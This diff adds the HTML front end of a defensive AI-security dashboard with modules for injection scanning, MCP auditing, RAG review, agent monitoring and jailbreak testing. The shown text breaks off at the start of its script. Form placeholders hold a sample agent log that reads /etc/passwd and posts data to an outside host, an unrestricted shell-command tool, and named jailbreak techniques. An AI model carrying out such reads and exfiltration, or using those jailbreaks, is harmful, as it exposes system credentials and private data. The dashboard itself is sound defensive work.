@@ -1,1 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>AI Security Sentinel</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Syne:wght@700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --red:#ef4444;--orange:#f97316;--green:#22c55e;--amber:#f59e0b;--blue:#3b82f6;--purple:#a855f7;
+  --dark:#08091a;--nav:#0b0c1e;--bg:#0d0f23;--card:#111328;--border:rgba(255,255,255,.08);--border2:rgba(255,255,255,.14);
+  --text:#e2e8f0;--text2:#94a3b8;--text3:#475569;
+  --crit-bg:rgba(239,68,68,.12);--crit-bd:rgba(239,68,68,.3);--crit-tx:#fca5a5;
+  --high-bg:rgba(249,115,22,.1);--high-bd:rgba(249,115,22,.3);--high-tx:#fdba74;
+  --med-bg:rgba(245,158,11,.1);--med-bd:rgba(245,158,11,.3);--med-tx:#fcd34d;
+  --low-bg:rgba(34,197,94,.08);--low-bd:rgba(34,197,94,.25);--low-tx:#86efac;
+  --nav-h:58px;
+}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+.nav{position:fixed;top:0;left:0;right:0;height:var(--nav-h);background:var(--nav);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 18px;gap:10px;z-index:900}
+.nav-logo{width:32px;height:32px;background:linear-gradient(135deg,#ef4444,#f97316);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0}
+.nav-brand{font-family:'Syne',sans-serif;font-size:15px;font-weight:800;color:#fff;letter-spacing:-.3px;margin-right:6px;white-space:nowrap}
+.nav-brand span{color:#ef4444}
+.ntabs{display:flex;gap:1px;flex:1;overflow-x:auto}.ntabs::-webkit-scrollbar{display:none}
+.ntab{background:none;border:none;padding:6px 12px;border-radius:6px;font-family:'DM Sans',sans-serif;font-size:12px;font-weight:600;color:var(--text3);cursor:pointer;white-space:nowrap;transition:all .15s}
+.ntab:hover{background:rgba(255,255,255,.06);color:var(--text2)}
+.ntab.active{background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.25)}
+.nav-right{display:flex;align-items:center;gap:8px;margin-left:auto}
+.nav-avatar{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#ef4444,#f97316);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;cursor:pointer;flex-shrink:0}
+.wrap{max-width:1300px;margin:0 auto;padding:calc(var(--nav-h)+22px) 20px 40px}
+.pg{display:none}.pg.on{display:block}
+/* Cards */
+.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px 20px;margin-bottom:14px}
+.card-hd{font-size:13px;font-weight:700;color:var(--text);margin-bottom:14px;display:flex;align-items:center;gap:8px}
+/* Stat grid */
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px;margin-bottom:14px}
+.stat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px}
+.stat-val{font-family:'DM Mono',monospace;font-size:24px;font-weight:700;line-height:1;margin-bottom:4px}
+.stat-lbl{font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.05em}
+/* Severity */
+.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:20px;font-size:11px;font-weight:700}
+.badge-crit{background:var(--crit-bg);color:var(--crit-tx);border:1px solid var(--crit-bd)}
+.badge-high{background:var(--high-bg);color:var(--high-tx);border:1px solid var(--high-bd)}
+.badge-med{background:var(--med-bg);color:var(--med-tx);border:1px solid var(--med-bd)}
+.badge-low{background:var(--low-bg);color:var(--low-tx);border:1px solid var(--low-bd)}
+.badge-none{background:rgba(71,85,105,.2);color:var(--text3);border:1px solid rgba(71,85,105,.3)}
+/* Forms */
+.inp{width:100%;padding:10px 14px;background:rgba(255,255,255,.05);border:1.5px solid var(--border);border-radius:8px;font-family:'DM Sans',sans-serif;font-size:13px;color:var(--text);outline:none;transition:border .2s}
+.inp:focus{border-color:#ef4444;background:rgba(239,68,68,.04)}
+.inp::placeholder{color:var(--text3)}
+textarea.inp{resize:vertical;min-height:80px}
+select.inp{cursor:pointer}
+.lbl{display:block;font-size:11px;font-weight:700;color:var(--text3);margin-bottom:5px;text-transform:uppercase;letter-spacing:.06em}
+.lbl-row{display:flex;align-items:center;gap:6px;margin-bottom:5px}
+.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.field{margin-bottom:10px}
+/* Buttons */
+.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 16px;border-radius:8px;font-family:'DM Sans',sans-serif;font-size:13px;font-weight:600;cursor:pointer;border:1px solid var(--border);background:rgba(255,255,255,.05);color:var(--text2);transition:all .15s}
+.btn:hover:not(:disabled){background:rgba(255,255,255,.1);color:var(--text)}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.btn-red{background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;border:none;box-shadow:0 3px 12px rgba(239,68,68,.3)}
+.btn-red:hover:not(:disabled){filter:brightness(1.1)}
+.btn-sm{padding:5px 11px;font-size:12px}
+/* Checkboxes */
+.check-row{display:flex;align-items:center;gap:8px;padding:8px 0;border-bottom:1px solid var(--border)}
+.check-row:last-child{border-bottom:none}
+/* Spinner */
+.spin{width:16px;height:16px;border:2px solid rgba(239,68,68,.3);border-top-color:#ef4444;border-radius:50%;animation:sp .6s linear infinite;display:inline-block}
+@keyframes sp{to{transform:rotate(360deg)}}
+/* Result boxes */
+.result-box{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:10px;padding:16px;margin-top:12px;font-size:13px;line-height:1.7}
+.result-box h3{font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)}
+.result-box p{color:var(--text2);margin-bottom:6px}
+.finding-row{display:flex;gap:10px;align-items:flex-start;padding:10px 0;border-bottom:1px solid var(--border)}
+.finding-row:last-child{border-bottom:none}
+.finding-icon{font-size:16px;flex-shrink:0;margin-top:1px}
+.finding-title{font-weight:700;font-size:13px;color:var(--text);margin-bottom:2px}
+.finding-desc{font-size:12px;color:var(--text2);line-height:1.5}
+/* Alerts */
+.alert{border-radius:8px;padding:10px 14px;font-size:13px;line-height:1.6;margin-bottom:10px}
+.alert-red{background:var(--crit-bg);border:1px solid var(--crit-bd);color:var(--crit-tx)}
+.alert-amber{background:var(--med-bg);border:1px solid var(--med-bd);color:var(--med-tx)}
+.alert-green{background:var(--low-bg);border:1px solid var(--low-bd);color:var(--low-tx)}
+.alert-blue{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);color:#93c5fd}
+/* Chat */
+.chat-wrap{display:flex;flex-direction:column;height:calc(100vh - 200px);max-height:660px}
+.chat-msgs{flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:10px}
+.chat-msg{display:flex;gap:8px;align-items:flex-start}
+.chat-msg.user{flex-direction:row-reverse}
+.msg-av{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0}
+.ai-av{background:linear-gradient(135deg,#ef4444,#f97316);color:#fff}
+.user-av{background:#1e293b;color:var(--text)}
+.msg-body{max-width:80%;padding:10px 14px;border-radius:10px;font-size:13px;line-height:1.7;white-space:pre-wrap}
+.ai-body{background:var(--card);border:1px solid var(--border)}
+.user-body{background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.25);border-radius:10px 2px 10px 10px}
+.chat-foot{padding:10px 14px;border-top:1px solid var(--border);display:flex;gap:8px}
+.chat-inp{flex:1;padding:10px 14px;border:1.5px solid var(--border);border-radius:8px;font-family:'DM Sans',sans-serif;font-size:13px;color:var(--text);background:rgba(255,255,255,.05);resize:none;outline:none}
+.chat-inp:focus{border-color:#ef4444}
+.chat-send{padding:10px 16px;background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;border:none;border-radius:8px;font-family:'DM Sans',sans-serif;font-size:13px;font-weight:700;cursor:pointer}
+.chat-send:disabled{opacity:.4;cursor:not-allowed}
+.quick-btns{display:flex;flex-wrap:wrap;gap:6px;padding:10px 14px;border-bottom:1px solid var(--border)}
+.qbtn{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:#fca5a5;border-radius:6px;padding:5px 10px;font-size:12px;font-weight:600;cursor:pointer;transition:all .15s;font-family:'DM Sans',sans-serif}
+.qbtn:hover{background:#ef4444;color:#fff}
+/* Table */
+.tbl-wrap{overflow-x:auto;border-radius:8px;border:1px solid var(--border)}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{padding:9px 13px;background:rgba(255,255,255,.04);font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:.05em;color:var(--text3);text-align:left;border-bottom:1px solid var(--border)}
+td{padding:10px 13px;border-bottom:1px solid var(--border);color:var(--text2);vertical-align:top}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:rgba(255,255,255,.02)}
+.td-name{font-weight:600;color:var(--text);font-size:13px}
+.td-mono{font-family:'DM Mono',monospace;font-size:12px}
+/* Empty */
+.empty{text-align:center;padding:40px 20px;color:var(--text3)}
+.empty-icon{font-size:32px;margin-bottom:10px}
+/* Progress bar */
+.prog-bar{height:8px;border-radius:4px;background:rgba(255,255,255,.07);overflow:hidden;margin-top:4px}
+.prog-fill{height:100%;border-radius:4px;transition:width .6s}
+/* Toast */
+#toast{position:fixed;bottom:20px;right:20px;background:#1e293b;border:1px solid var(--border2);color:var(--text);padding:10px 16px;border-radius:8px;font-size:13px;font-weight:600;z-index:9999;opacity:0;transform:translateY(6px);transition:all .25s;pointer-events:none;max-width:320px}
+#toast.show{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
 
+<nav class="nav" id="main-nav" style="display:none">
+  <div class="nav-logo">🛡</div>
+  <div class="nav-brand">AI Security<span>Sentinel</span></div>
+  <div class="ntabs">
+    <button class="ntab active" onclick="goTab('dashboard',this)">🏠 Dashboard</button>
+    <button class="ntab" onclick="goTab('prompt',this)">💉 Prompt Injection</button>
+    <button class="ntab" onclick="goTab('mcp',this)">🔌 MCP Auditor</button>
+    <button class="ntab" onclick="goTab('rag',this)">📚 RAG Security</button>
+    <button class="ntab" onclick="goTab('agent',this)">🤖 Agent Monitor</button>
+    <button class="ntab" onclick="goTab('jailbreak',this)">🎯 Red Teamer</button>
+    <button class="ntab" onclick="goTab('leakage',this)">🔍 Data Leakage</button>
+    <button class="ntab" onclick="goTab('supply',this)">📦 Supply Chain</button>
+    <button class="ntab" onclick="goTab('compliance',this)">📋 Compliance</button>
+    <button class="ntab" onclick="goTab('chat',this)">💬 AI Analyst</button>
+    <button class="ntab" onclick="goTab('settings',this)">⚙ Settings</button>
+  </div>
+  <div class="nav-right">
+    <div class="nav-avatar" id="nav-avatar">?</div>
+  </div>
+</nav>
+
+<div class="wrap">
+
+<!-- ═══ DASHBOARD ═══ -->
+<div class="pg on" id="pg-dashboard">
+  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:18px">
+    <div>
+      <div style="font-family:'Syne',sans-serif;font-size:22px;font-weight:900;color:#fff">Security Dashboard</div>
+      <div style="font-size:13px;color:var(--text3);margin-top:2px">AI threat visibility across all 10 security modules</div>
+    </div>
+    <button class="btn btn-red btn-sm" onclick="loadDashboard()">↻ Refresh</button>
+  </div>
+  <div class="stat-grid" id="dash-stats">
+    <div class="stat"><div class="stat-val" style="color:#ef4444" id="d-total">—</div><div class="stat-lbl">Total Scans</div></div>
+    <div class="stat"><div class="stat-val" style="color:#ef4444" id="d-crit">—</div><div class="stat-lbl">Critical Alerts</div></div>
+    <div class="stat"><div class="stat-val" style="color:#f97316" id="d-high">—</div><div class="stat-lbl">High Alerts</div></div>
+    <div class="stat"><div class="stat-val" style="color:#f59e0b" id="d-today">—</div><div class="stat-lbl">Scans Today</div></div>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">
+    <div class="card">
+      <div class="card-hd">🚨 Recent alerts</div>
+      <div id="dash-alerts"><div class="empty"><div class="spin"></div></div></div>
+    </div>
+    <div class="card">
+      <div class="card-hd">📊 Recent scans</div>
+      <div id="dash-scans"><div class="empty"><div class="spin"></div></div></div>
+    </div>
+  </div>
+  <div class="card" style="margin-top:14px">
+    <div class="card-hd">🛡 Module coverage</div>
+    <div id="dash-modules" style="display:grid;grid-template-columns:repeat(5,1fr);gap:10px">
+      <div style="text-align:center;padding:12px 8px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;cursor:pointer" onclick="goTab('prompt',document.querySelectorAll('.ntab')[1])">
+        <div style="font-size:20px;margin-bottom:6px">💉</div><div style="font-size:11px;font-weight:700;color:var(--text2)">Prompt Injection</div>
+      </div>
+      <div style="text-align:center;padding:12px 8px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;cursor:pointer" onclick="goTab('mcp',document.querySelectorAll('.ntab')[2])">
+        <div style="font-size:20px;margin-bottom:6px">🔌</div><div style="font-size:11px;font-weight:700;color:var(--text2)">MCP Auditor</div>
+      </div>
+      <div style="text-align:center;padding:12px 8px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;cursor:pointer" onclick="goTab('rag',document.querySelectorAll('.ntab')[3])">
+        <div style="font-size:20px;margin-bottom:6px">📚</div><div style="font-size:11px;font-weight:700;color:var(--text2)">RAG Security</div>
+      </div>
+      <div style="text-align:center;padding:12px 8px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;cursor:pointer" onclick="goTab('jailbreak',document.querySelectorAll('.ntab')[5])">
+        <div style="font-size:20px;margin-bottom:6px">🎯</div><div style="font-size:11px;font-weight:700;color:var(--text2)">Red Teamer</div>
+      </div>
+      <div style="text-align:center;padding:12px 8px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;cursor:pointer" onclick="goTab('compliance',document.querySelectorAll('.ntab')[8])">
+        <div style="font-size:20px;margin-bottom:6px">📋</div><div style="font-size:11px;font-weight:700;color:var(--text2)">Compliance</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PROMPT INJECTION ═══ -->
+<div class="pg" id="pg-prompt">
+  <div class="card-hd" style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">💉 Prompt Injection Scanner</div>
+  <div class="alert alert-blue" style="margin-bottom:14px">Tests prompts and responses against 10+ injection patterns + Claude AI analysis. Covers OWASP LLM01 (2025).</div>
+  <div class="card">
+    <div class="field"><label class="lbl">Prompt to scan</label><textarea class="inp" id="pi-prompt" rows="4" placeholder="Paste the user prompt or AI input to scan for injection attacks…"></textarea></div>
+    <div class="field"><label class="lbl">AI Response (optional — scan output too)</label><textarea class="inp" id="pi-response" rows="3" placeholder="Paste the model's response to check for manipulation signs…"></textarea></div>
+    <div style="display:flex;gap:8px;align-items:center">
+      <button class="btn btn-red" id="pi-btn" onclick="runPromptInjection()">🔍 Scan for Injection</button>
+      <label style="display:flex;align-items:center;gap:6px;font-size:13px;color:var(--text2);cursor:pointer"><input type="checkbox" id="pi-ai" checked> Use Claude AI analysis</label>
+    </div>
+  </div>
+  <div id="pi-result"></div>
+</div>
+
+<!-- ═══ MCP AUDITOR ═══ -->
+<div class="pg" id="pg-mcp">
+  <div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">🔌 MCP Server Auditor</div>
+  <div class="alert alert-blue" style="margin-bottom:14px">Audits MCP server tools for overly broad permissions, missing validation, injection surfaces and dangerous capabilities.</div>
+  <div class="card">
+    <div class="form-grid">
+      <div class="field"><label class="lbl">MCP Server Name</label><input class="inp" id="mcp-name" placeholder="e.g. filesystem-server, github-mcp"></div>
+      <div class="field"><label class="lbl">Description</label><input class="inp" id="mcp-desc" placeholder="What does this server do?"></div>
+    </div>
+    <div class="field"><label class="lbl">Tools JSON (array of tool definitions)</label>
+      <textarea class="inp" id="mcp-tools" rows="8" placeholder='[{"name":"read_file","description":"Reads any file from the filesystem","inputSchema":{"type":"object","properties":{"path":{"type":"string"}}}},{"name":"execute_command","description":"Runs shell commands","inputSchema":{"type":"object","properties":{"cmd":{"type":"string"}}}}]'></textarea>
+    </div>
+    <button class="btn btn-red" id="mcp-btn" onclick="runMCPAudit()">🔌 Audit MCP Server</button>
+  </div>
+  <div id="mcp-result"></div>
+</div>
+
+<!-- ═══ RAG SECURITY ═══ -->
+<div class="pg" id="pg-rag">
+  <div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">📚 RAG Pipeline Security Assessor</div>
+  <div class="alert alert-blue" style="margin-bottom:14px">Evaluates RAG pipelines for corpus poisoning, retrieval hijacking, embedding manipulation and PII leakage risks.</div>
+  <div class="card">
+    <div class="form-grid">
+      <div class="field"><label class="lbl">Vector Store</label><input class="inp" id="rag-vs" placeholder="e.g. Pinecone, Weaviate, Azure AI Search, ChromaDB"></div>
+      <div class="field"><label class="lbl">Embedding Model</label><input class="inp" id="rag-em" placeholder="e.g. text-embedding-ada-002, UAE-Large-V1"></div>
+    </div>
+    <div class="form-grid">
+      <div class="field"><label class="lbl">Retrieval Strategy</label>
+        <select class="inp" id="rag-rs">
+          <option>Similarity search (cosine)</option><option>Hybrid (keyword + vector)</option>
+          <option>MMR (Maximum Marginal Relevance)</option><option>BM25 only</option><option>Custom reranker</option>
+        </select>
+      </div>
+      <div class="field"><label class="lbl">Access Control</label>
+        <select class="inp" id="rag-ac">
+          <option value="none">None — all users see all docs</option>
+          <option value="basic">Basic (filter by user/role metadata)</option>
+          <option value="row-level">Row-level security</option>
+          <option value="document-level">Document-level ACL</option>
+        </select>
+      </div>
+    </div>
+    <div class="field"><label class="lbl">Data Classification</label>
+      <select class="inp" id="rag-dc"><option>Public</option><option>Internal</option><option>Confidential</option><option>Secret</option><option>Mixed classifications</option></select>
+    </div>
+    <div class="field"><label class="lbl">Sample queries (one per line, optional)</label>
+      <textarea class="inp" id="rag-queries" rows="3" placeholder="What is our pricing for enterprise?&#10;Show me employee salaries&#10;List all customer PII"></textarea>
+    </div>
+    <button class="btn btn-red" id="rag-btn" onclick="runRAGAssessment()">📚 Assess RAG Pipeline</button>
+  </div>
+  <div id="rag-result"></div>
+</div>
+
+<!-- ═══ AGENT MONITOR ═══ -->
+<div class="pg" id="pg-agent">
+  <div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">🤖 Agent Behaviour Monitor</div>
+  <div class="alert alert-blue" style="margin-bottom:14px">Analyses agent tool call logs for anomalies, goal misalignment, privilege escalation and data exfiltration patterns.</div>
+  <div class="card">
+    <div class="form-grid">
+      <div class="field"><label class="lbl">Agent Name</label><input class="inp" id="ab-name" placeholder="e.g. customer-support-agent, code-assistant"></div>
+      <div class="field"><label class="lbl">Time Window (minutes)</label><input class="inp" type="number" id="ab-window" value="60"></div>
+    </div>
+    <div class="field"><label class="lbl">System Prompt (optional)</label><textarea class="inp" id="ab-sysprompt" rows="2" placeholder="Paste the agent's system prompt for context…"></textarea></div>
+    <div class="field"><label class="lbl">Tool Call Logs (JSON array)</label>
+      <textarea class="inp" id="ab-logs" rows="8" placeholder='[{"tool":"read_file","input":{"path":"/etc/passwd"},"output":"root:x:0:0...","timestamp":"2025-01-01T10:00:00Z"},{"tool":"http_post","input":{"url":"https://external.com","body":"sensitive_data"},"timestamp":"2025-01-01T10:00:05Z"}]'></textarea>
+    </div>
+    <button class="btn btn-red" id="ab-btn" onclick="runAgentMonitor()">🤖 Analyse Agent Behaviour</button>
+  </div>
+  <div id="ab-result"></div>
+</div>
+
+<!-- ═══ JAILBREAK RED TEAMER ═══ -->
+<div class="pg" id="pg-jailbreak">
+  <div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">🎯 Jailbreak Red Teamer</div>
+  <div class="alert alert-blue" style="margin-bottom:14px">Tests your system prompt against 12+ known jailbreak techniques. Returns resilience score + specific hardening steps.</div>
+  <div class="card">
+    <div class="field"><label class="lbl">System Prompt to test</label><textarea class="inp" id="jb-prompt" rows="6" placeholder="Paste your AI application's system prompt here. The red teamer will test it against DAN, grandma exploit, developer mode, role-play overrides, token manipulation, indirect injection and more…"></textarea></div>
+    <div class="field"><label class="lbl">Target Model</label>
+      <select class="inp" id="jb-model">
+        <option value="claude">Claude (Anthropic)</option><option value="gpt4">GPT-4 (OpenAI)</option>
+        <option value="gemini">Gemini (Google)</option><option value="llama">Llama (Meta)</option><option value="other">Other</option>
+      </select>
+    </div>
+    <button class="btn btn-red" id="jb-btn" onclick="runJailbreak()">🎯 Run Red Team Tests</button>
+  </div>
+  <div id="jb-result"></div>
+</div>
+
+<!-- ═══ DATA LEAKAGE ═══ -->
+<div class="pg" id="pg-leakage">
+  <div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">🔍 Data Leakage Detector</div>
+  <div class="alert alert-blue" style="margin-bottom:14px">Scans AI outputs for PII, credentials, API keys, IBANs, UAE National IDs and custom patterns. 10 built-in detectors.</div>
+  <div class="card">
+    <div class="field"><label class="lbl">Text to scan (AI output, prompt, log)</label><textarea class="inp" id="dl-text" rows="8" placeholder="Paste any text to scan — model output, conversation log, tool response, retrieved document…"></textarea></div>
+    <div class="field"><label class="lbl">Source label</label><input class="inp" id="dl-source" placeholder="e.g. customer-support bot output, RAG retrieval result"></div>
+    <button class="btn btn-red" id="dl-btn" onclick="runDataLeakage()">🔍 Scan for Data Leakage</button>
+  </div>
+  <div id="dl-result"></div>
+</div>
+
+<!-- ═══ SUPPLY CHAIN ═══ -->
+<div class="pg" id="pg-supply">
+  <div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">📦 Supply Chain Checker</div>
+  <div class="alert alert-blue" style="margin-bottom:14px">Checks AI models, packages and data sources for provenance, known CVEs, backdoor risks and licensing issues.</div>
+  <div class="card">
+    <div class="field"><label class="lbl">AI Models (one per line)</label><textarea class="inp" id="sc-models" rows="4" placeholder="meta-llama/Llama-2-7b&#10;mistralai/Mistral-7B-v0.1&#10;sentence-transformers/all-MiniLM-L6-v2"></textarea></div>
+    <div class="field"><label class="lbl">Python / npm Packages (one per line)</label><textarea class="inp" id="sc-pkgs" rows="3" placeholder="langchain&#10;llama-index&#10;chromadb&#10;transformers"></textarea></div>
+    <div class="field"><label class="lbl">Data Sources / Connectors (one per line)</label><textarea class="inp" id="sc-sources" rows="3" placeholder="SharePoint (no auth)&#10;Public S3 bucket&#10;Internal PostgreSQL (RLS enabled)"></textarea></div>
+    <button class="btn btn-red" id="sc-btn" onclick="runSupplyChain()">📦 Check Supply Chain</button>
+  </div>
+  <div id="sc-result"></div>
+</div>
+
+<!-- ═══ COMPLIANCE ═══ -->
+<div class="pg" id="pg-compliance">
+  <div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">📋 Compliance Reporter</div>
+  <div class="alert alert-blue" style="margin-bottom:14px">Maps your AI application against OWASP LLM Top 10 (2025), NIST AI RMF and EU AI Act. Generates gap report with priority actions.</div>
+  <div class="card">
+    <div class="field"><label class="lbl">Application Description</label><textarea class="inp" id="co-desc" rows="3" placeholder="Describe your AI application — what it does, who uses it, what data it processes…"></textarea></div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:10px">
+      <div>
+        <div class="lbl" style="margin-bottom:8px">Frameworks to assess against</div>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text2);margin-bottom:6px;cursor:pointer"><input type="checkbox" id="co-owasp" checked> OWASP LLM Top 10 (2025)</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text2);margin-bottom:6px;cursor:pointer"><input type="checkbox" id="co-nist" checked> NIST AI Risk Management Framework</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text2);cursor:pointer"><input type="checkbox" id="co-eu"> EU AI Act</label>
+      </div>
+      <div>
+        <div class="lbl" style="margin-bottom:8px">Current controls in place</div>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text2);margin-bottom:6px;cursor:pointer"><input type="checkbox" id="co-guards"> Runtime guardrails</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text2);margin-bottom:6px;cursor:pointer"><input type="checkbox" id="co-red"> Red teaming done</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text2);margin-bottom:6px;cursor:pointer"><input type="checkbox" id="co-audit"> Audit logging</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text2);margin-bottom:6px;cursor:pointer"><input type="checkbox" id="co-human"> Human oversight</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text2);margin-bottom:6px;cursor:pointer"><input type="checkbox" id="co-pii"> Processes PII</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text2);cursor:pointer"><input type="checkbox" id="co-highrisk"> High-risk AI app (EU)</label>
+      </div>
+    </div>
+    <button class="btn btn-red" id="co-btn" onclick="runCompliance()">📋 Generate Compliance Report</button>
+  </div>
+  <div id="co-result"></div>
+</div>
+
+<!-- ═══ AI CHAT ═══ -->
+<div class="pg" id="pg-chat">
+  <div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">💬 AI Security Analyst</div>
+  <div class="card" style="padding:0;overflow:hidden">
+    <div class="quick-btns">
+      <button class="qbtn" onclick="quickQ('What are the top 5 OWASP LLM threats I should prioritise in 2025?')">OWASP Top 5</button>
+      <button class="qbtn" onclick="quickQ('How do I harden a system prompt against jailbreaks and extraction?')">Harden system prompt</button>
+      <button class="qbtn" onclick="quickQ('What MCP security controls should I implement before going to production?')">MCP production checklist</button>
+      <button class="qbtn" onclick="quickQ('How do I detect prompt injection in RAG retrieved documents?')">RAG injection defence</button>
+      <button class="qbtn" onclick="quickQ('Create an AI security threat model for a customer-facing chatbot')">Threat model chatbot</button>
+      <button class="qbtn" onclick="quickQ('What does the EU AI Act require for high-risk AI systems?')">EU AI Act guide</button>
+      <button class="qbtn" onclick="quickQ('How do I monitor agent-to-agent communication for security risks?')">A2A security</button>
+      <button class="qbtn" onclick="quickQ('What is corpus poisoning in RAG and how do I prevent it?')">RAG corpus poisoning</button>
+    </div>
+    <div id="chat-key-warn" style="padding:8px 14px;border-bottom:1px solid var(--border)"></div>
+    <div class="chat-wrap">
+      <div class="chat-msgs" id="chat-msgs"></div>
+      <div class="chat-foot">
+        <textarea class="chat-inp" id="chat-inp" rows="1" placeholder="Ask anything about AI security, MCP threats, RAG vulnerabilities, OWASP LLM…" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendChat()}"></textarea>
+        <button class="chat-send" id="chat-send" onclick="sendChat()">➤</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SETTINGS ═══ -->
+<div class="pg" id="pg-settings">
+  <div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:900;color:#fff;margin-bottom:14px">⚙ Settings</div>
+  <div class="card" style="margin-bottom:14px">
+    <div style="display:flex;align-items:center;gap:14px">
+      <div id="s-avatar" style="width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#ef4444,#f97316);display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:800;color:#fff">?</div>
+      <div style="flex:1"><div style="font-weight:700;font-size:14px;color:var(--text)">Signed in as <span id="s-name" style="color:#ef4444">—</span></div>
+      <div style="font-size:12px;color:var(--text3);margin-top:2px" id="s-role">—</div></div>
+      <button class="btn btn-sm" style="color:#ef4444;border-color:rgba(239,68,68,.3)" onclick="doLogout()">Sign out</button>
+    </div>
+  </div>
+  <div class="card" style="margin-bottom:14px">
+    <div class="card-hd">🤖 Anthropic API Key <span style="font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;background:rgba(239,68,68,.12);color:#fca5a5;border:1px solid rgba(239,68,68,.25);margin-left:6px">Admin only</span></div>
+    <div id="s-api-nonadmin" style="display:none" class="alert alert-green">✓ API key set by Admin — all AI analysis features are active.</div>
+    <div id="s-api-admin">
+      <div id="s-api-preview" style="display:none;margin-bottom:10px;padding:8px 12px;background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:6px;font-size:12px;font-family:'DM Mono',monospace;color:var(--low-tx)"></div>
+      <label class="lbl">New API Key</label>
+      <div style="position:relative;margin-bottom:10px">
+        <input class="inp" type="password" id="s-api-inp" placeholder="sk-ant-api03-…">
+        <button onclick="document.getElementById('s-api-inp').type=document.getElementById('s-api-inp').type==='password'?'text':'password'" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--text3)">👁</button>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <button class="btn btn-red btn-sm" onclick="saveApiKey()">💾 Save API Key</button>
+        <span id="s-api-result" style="font-size:12px"></span>
+      </div>
+    </div>
+  </div>
+  <div class="card" id="s-users-card" style="display:none">
+    <div class="card-hd">👥 Team members</div>
+    <div id="s-user-list" style="margin-bottom:12px"></div>
+  </div>
+</div>
+
+</div><!-- /wrap -->
+<div id="toast"></div>
+
+<script>
+// ── State ─────────────────────────────────────────────────────────────────────
+let me = null, chatHistory = [];
+
+// ── Boot ──────────────────────────────────────────────────────────────────────
+(async function boot() {
+  try {
+    const r = await fetch('/api/me', { credentials: 'same-origin' });
+    if (!r.ok) { window.location.href = '/'; return; }
+    me = await r.json();
